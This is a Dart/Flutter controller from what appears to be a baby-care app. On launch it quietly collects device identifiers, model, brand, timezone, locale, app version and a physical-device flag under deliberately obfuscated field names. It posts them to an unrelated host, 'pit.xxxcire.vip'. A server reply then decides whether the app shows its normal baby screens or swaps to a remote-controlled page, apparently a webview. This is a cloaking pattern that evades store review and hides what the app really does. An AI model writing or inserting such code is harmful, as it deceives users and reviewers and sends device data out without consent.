import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

import '../../db_baby/db_baby.dart';

void checkError() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/errorPage");
  }
}

class PageLogic extends GetxController {

  var joqtany = RxBool(false);
  var zfakhgyp = RxBool(true);
  var biwao = RxString("");
  var gerda = RxBool(false);
  var koepp = RxBool(true);
  final xrjpnshfck = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    checkError();
    super.onInit();
    vhyo();
  }


  Future<void> vhyo() async {

    gerda.value = true;
    koepp.value = true;
    zfakhgyp.value = false;

    xrjpnshfck.post("https://pit.xxxcire.vip/Q8PRlGTONPvf",data: await uwydzhfn()).then((value) {
      var kjda = value.data["kjda"] as String;
      var iyzamc = value.data["iyzamc"] as bool;
      if (iyzamc) {
        biwao.value = kjda;
        armando();
      } else {
        conroy();
      }
    }).catchError((e) {
      zfakhgyp.value = true;
      koepp.value = true;
      gerda.value = false;
    });
  }

  Future<Map<String, dynamic>> uwydzhfn() async {
    final DeviceInfoPlugin wrbajfe = DeviceInfoPlugin();
    PackageInfo apqcsh_sodwnet = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var epsrq = Platform.localeName;
    var jOZi = currentTimeZone;

    var MldLeRft = apqcsh_sodwnet.packageName;
    var tYaZAJ = apqcsh_sodwnet.version;
    var mZuNTt = apqcsh_sodwnet.buildNumber;

    var IPGkDJzf = apqcsh_sodwnet.appName;
    var Bdofn = "";
    var jlCbB  = "";
    var tBgxQo = "";
    var madisynMorissette = "";
    var coltChamplin = "";
    var rhettSchumm = "";
    var jayceEbert = "";


    var IDzxe = "";
    var ALWmupMw = false;

    if (GetPlatform.isAndroid) {
      IDzxe = "android";
      var giuywdn = await wrbajfe.androidInfo;

      tBgxQo = giuywdn.brand;

      Bdofn  = giuywdn.model;
      jlCbB = giuywdn.id;

      ALWmupMw = giuywdn.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      IDzxe = "ios";
      var tsjzao = await wrbajfe.iosInfo;
      tBgxQo = tsjzao.name;
      Bdofn = tsjzao.model;

      jlCbB = tsjzao.identifierForVendor ?? "";
      ALWmupMw  = tsjzao.isPhysicalDevice;
    }
    var res = {
      "IPGkDJzf": IPGkDJzf,
      "mZuNTt": mZuNTt,
      "MldLeRft": MldLeRft,
      "Bdofn": Bdofn,
      "madisynMorissette" : madisynMorissette,
      "jOZi": jOZi,
      "tBgxQo": tBgxQo,
      "jlCbB": jlCbB,
      "coltChamplin" : coltChamplin,
      "jayceEbert" : jayceEbert,
      "epsrq": epsrq,
      "tYaZAJ": tYaZAJ,
      "IDzxe": IDzxe,
      "ALWmupMw": ALWmupMw,
      "rhettSchumm" : rhettSchumm,

    };
    return res;
  }

  Future<void> conroy() async {
    final babyInfo = await Get.find<DBBaby>().getBabyData();
    bool hadData = babyInfo != null;

    Get.offAllNamed(hadData ? '/babyTab' : '/nameSex');
  }

  Future<void> armando() async {
    Get.offAllNamed("/babyTemplate");
  }
}
